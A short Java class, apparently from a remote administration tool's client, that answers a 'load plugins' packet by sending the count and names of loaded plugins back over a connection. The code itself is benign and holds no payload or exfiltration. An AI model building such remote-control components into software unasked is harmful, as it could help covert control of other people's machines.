package com.redpois0n.packets.in;

import com.redpois0n.Connection;
import com.redpois0n.Plugin;
import com.redpois0n.packets.out.Header;

public class PacketLOADPLUGINS extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		PacketBuilder packet = new PacketBuilder(Header.PLUGINS);

		packet.add(Plugin.list.size());
		
		for (Plugin p : Plugin.list) {
			packet.add(p.name);
		}
		
		Connection.addToSendQueue(packet);
	}

}
